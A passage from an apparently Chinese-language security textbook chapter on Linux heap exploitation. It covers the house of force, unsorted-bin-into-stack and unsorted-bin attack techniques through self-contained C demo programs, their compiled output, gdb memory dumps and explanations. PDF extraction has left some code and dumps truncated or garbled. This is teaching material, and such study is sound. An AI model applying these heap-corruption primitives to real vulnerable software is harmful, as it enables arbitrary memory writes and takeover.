fprintf(stderr, "\nThe value we want to write to at %p, and
the top chunk is at %p, so accounting for the header size, we wi
ll malloc %#lx bytes.\n", bss_var, ptr_top, evil_size);
void *new_ptr = malloc(evil_size);
int real_size_new = malloc_usable_size(new_ptr);
memset((char *)new_ptr + real_size_new - 0x20, 'A', 0x20);
fprintf(stderr, "As expected, the new pointer is at the same
place as the old top chunk: %p\n", new_ptr);
void* ctr_chunk = malloc(0x30);
fprintf(stderr, "malloc(0x30) => %p!\n", ctr_chunk);
fprintf(stderr, "\nNow, the next chunk we overwrite will poi
nt at our target buffer, so we can overwrite the value.\n");
fprintf(stderr, "old string: %s\n", bss_var);
strcpy(ctr_chunk, "YEAH!!!");
fprintf(stderr, "new string: %s\n", bss_var);
}
512
3.1.8 Linux 堆利用（三）
$ gcc -g house_of_force.c
$ ./a.out
We will overwrite a variable at 0x601080
Let's allocate the first chunk of 0x10 bytes: 0x824010.
Real size of our allocated chunk is 0x18.
Overwriting the top chunk size with a big value so the malloc wi
ll never call mmap.
Old size of top chunk: 0x20fe1
New size of top chunk: 0xffffffffffffffff
The value we want to write to at 0x601080, and the top chunk is
at 0x824028, so accounting for the header size, we will malloc 0
xffffffffffddd048 bytes.
As expected, the new pointer is at the same place as the old top
chunk: 0x824030
malloc(0x30) => 0x601080!
Now, the next chunk we overwrite will point at our target buffer
, so we can overwrite the value.
old string: This is a string that we want to overwrite.
new string: YEAH!!!
house_of_force 是一种通过改写 top chunk 的 size 字段来欺骗 malloc 返回任意地
址的技术。我们知道在空闲内存的最高处，必然存在一块空闲的 chunk，即 top
chunk，当 bins 和 fast bins 都不能满足分配需要的时候，malloc 会从 top chunk 中
分出一块内存给用户。所以 top chunk 的大小会随着分配和回收不停地变化。这种
攻击假设有一个溢出漏洞，可以改写 top chunk 的头部，然后将其改为一个非常大
的值，以确保所有的 malloc 将使用 top chunk 分配，而不会调用 mmap。这时如果
攻击者 malloc 一个很大的数目（负有符号整数），top chunk 的位置加上这个大
数，造成整数溢出，结果是 top chunk 能够被转移到堆之前的内存地址（如程序的
.bss 段、.data 段、GOT 表等），下次再执行 malloc 时，攻击者就能够控制转移
之后地址处的内存。
首先随意分配一个 chunk，此时内存里存在两个 chunk，即 chunk 1 和 top
chunk：
513
3.1.8 Linux 堆利用（三）
gef➤ x/8gx 0x602010-0x10
0x602000: 0x0000000000000000 0x0000000000000021 : 0x2073692073696854 0x676e697274732061
: 0x6577207461687420 0x6f7420746e6177
20
0x6010a0 : 0x6972777265766f20 0x00000000002e65
74
0x6010b0: 0x0000000000000000 0x0000000000000000
再次 malloc，将目标地址包含进来即可，现在我们就成功控制了目标内存：
gef➤ x/12gx 0x602010+0xfffffffffffff050
0x601060: 0x4141414141414141 0x4141414141414141
0x601070: 0x4141414141414141 0x0000000000000041 : 0x2073692073696854 0x676e697274732061
: 0x6577207461687420 0x6f7420746e6177
20
0x6010a0 : 0x6972777265766f20 0x00000000002e65
74
0x6010b0: 0x0000000000000000 0x0000000000000f69 
#include 
int main() {
unsigned long stack_buf[4] = {0};
unsigned long *victim = malloc(0x80);
unsigned long *p1 = malloc(0x10);
fprintf(stderr, "Allocating the victim chunk at %p\n", victi
m);
// deal with tcache
// int *k[10], i;
// for (i = 0; i size: %p\n", (void *)stack_buf[1]);
fprintf(stderr, "fake->bk: %p\n\n", (void *)stack_buf[3]);
victim[1] = (unsigned long)stack_buf;
fprintf(stderr, "Now we overwrite the victim->bk pointer to
stack: %p\n\n", stack_buf);
fprintf(stderr, "Malloc a chunk which size is 0x110 will ret
urn the region of our fake chunk: %p\n", &stack_buf[2]);
516
3.1.8 Linux 堆利用（三）
unsigned long *fake = malloc(0x100);
fprintf(stderr, "malloc(0x100): %p\n", fake);
}
$ gcc -g unsorted_bin_into_stack.c
$ ./a.out
Allocating the victim chunk at 0x17a1010
Freeing the chunk, it will be inserted in the unsorted bin
Create a fake chunk on the stack
fake->size: 0x110
fake->bk: 0x7fffcd906480
Now we overwrite the victim->bk pointer to stack: 0x7fffcd906480
Malloc a chunk which size is 0x110 will return the region of our
fake chunk: 0x7fffcd906490
malloc(0x100): 0x7fffcd906490
unsorted-bin-into-stack 通过改写 unsorted bin 里 chunk 的 bk 指针到任意地址，从
而在栈上 malloc 出 chunk。
首先将一个 chunk 放入 unsorted bin，并且在栈上伪造一个 chunk：
gdb-peda$ x/6gx victim - 2
0x602000: 0x0000000000000000 0x0000000000000091 
#include 
int main() {
unsigned long stack_var = 0;
fprintf(stderr, "The target we want to rewrite on stack: %p
-> %ld\n\n", &stack_var, stack_var);
unsigned long *p = malloc(0x80);
unsigned long *p1 = malloc(0x10);
fprintf(stderr, "Now, we allocate first small chunk on the h
eap at: %p\n",p);
free(p);
fprintf(stderr, "We free the first chunk now. Its bk pointer
point to %p\n", (void*)p[1]);
p[1] = (unsigned long)(&stack_var - 2);
fprintf(stderr, "We write it with the target address-0x10: %
p\n\n", (void*)p[1]);
malloc(0x80);
fprintf(stderr, "Let's malloc again to get the chunk we just
free: %p -> %p\n", &stack_var, (void*)stack_var);
}
$ gcc -g unsorted_bin_attack.c
$ ./a.out
The target we want to rewrite on stack: 0x7ffc9b1d61b0 -> 0
Now, we allocate first small chunk on the heap at: 0x1066010
We free the first chunk now. Its bk pointer point to 0x7f2404cf5
b78
We write it with the target address-0x10: 0x7ffc9b1d61a0
Let's malloc again to get the chunk we just free: 0x7ffc9b1d61b0
-> 0x7f2404cf5b78
521